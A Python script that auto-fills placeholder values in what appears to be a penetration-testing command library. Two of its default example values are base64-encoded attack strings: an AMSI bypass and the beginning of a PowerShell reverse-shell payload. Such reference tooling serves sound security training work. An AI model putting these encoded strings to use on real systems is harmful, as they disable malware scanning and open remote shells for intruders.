#!/usr/bin/env python3
"""Auto-generate filled_example fields for commands with placeholders"""

import json
import re
from pathlib import Path

# Default examples for placeholders missing variable definitions
DEFAULT_EXAMPLES = {
    'PASSWORD': 'P@ssw0rd123!',
    'PASS': 'P@ssw0rd123!',
    'NTLM_HASH': 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0',
    'HASH': 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0',
    'TARGET': '192.168.1.100',
    'TARGET_IP': '192.168.1.100',
    'DC_IP': '192.168.1.10',
    'DOMAIN': 'corp.local',
    'DOMAIN_FQDN': 'corp.local',
    'USERNAME': 'admin',
    'USER': 'admin',
    'LHOST': '192.168.45.5',
    'LPORT': '443',
    'RHOST': '192.168.1.100',
    'RPORT': '445',
    'PORT': '445',
    'IP': '192.168.1.100',
    'HOST': '192.168.1.100',
    'WORDLIST': '/usr/share/wordlists/rockyou.txt',
    'FILE': '/tmp/file.txt',
    'FILE_PATH': '/tmp/file.txt',
    'OUTPUT': '/tmp/output.txt',
    'PATH': '/tmp',
    'URL': 'http://192.168.1.100',
    'COMMAND': 'whoami',
    'CMD': 'whoami',
    'BASE64_BYPASS': 'W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUp',
    'BASE64_PAYLOAD': 'cG93ZXJzaGVsbCAtZSBKQUJqQUd3QWFRQmxBRzRBZEFBZ0FEMEFJQUJPQUdVQWR3QXRBRThBWWdCcUFHVUFZd0IwQUNBQVV3QjVBSE1BZEFCbEFHMEFMZ0JPQUdVQWRBQXVBRk1BYndCagpBR3NBWlFCMEFITUFMZ0JVQUVNQVVBQWJBR3dBYVFCbEFHNEFkQUFvQUNJQU1RQTVBR0lBTGdBeEFEWUFPQUF1QURFQU1RQTRB',
}


def generate_filled_example(cmd):
    """Generate filled_example from command template and variable examples"""
    template = cmd.get('command', '')

    # First pass: use variable examples
    for var in cmd.get('variables', []):
        if isinstance(var, dict):
            var_name = var.get('name', '')
            var_example = var.get('example', '')
            if var_name and var_example:
                template = template.replace(var_name, str(var_example))

    # Second pass: use defaults for any remaining placeholders
    for placeholder, default in DEFAULT_EXAMPLES.items():
        template = template.replace(f'<{placeholder}>', default)

    return template


def process_file(json_file):
    """Add filled_example to commands that need it"""
    with open(json_file, 'r') as f:
        data = json.load(f)

    modified = False
    warnings = []

    for cmd in data.get('commands', []):
        command_text = cmd.get('command', '')
        placeholders = set(re.findall(r'<[A-Z0-9_]+>', command_text))

        if placeholders and not cmd.get('filled_example'):
            filled = generate_filled_example(cmd)
            # Only add if all placeholders were replaced
            remaining = set(re.findall(r'<[A-Z0-9_]+>', filled))
            if not remaining:
                cmd['filled_example'] = filled
                modified = True
            else:
                warnings.append(f"  WARN: {cmd.get('id')} still has: {remaining}")

    if modified:
        with open(json_file, 'w') as f:
            json.dump(data, f, indent=2)

    return modified, warnings


def main():
    commands_dir = Path(__file__).parent.parent / 'data' / 'commands'
    updated = 0
    all_warnings = []

    print(f"Processing files in: {commands_dir}")
    print("=" * 60)

    for json_file in sorted(commands_dir.rglob('*.json')):
        modified, warnings = process_file(json_file)
        if modified:
            print(f"Updated: {json_file.relative_to(commands_dir)}")
            updated += 1
        if warnings:
            all_warnings.extend(warnings)

    print("=" * 60)
    print(f"Total files updated: {updated}")

    if all_warnings:
        print(f"\nWarnings ({len(all_warnings)} commands still have unfilled placeholders):")
        for w in all_warnings:
            print(w)


if __name__ == '__main__':
    main()
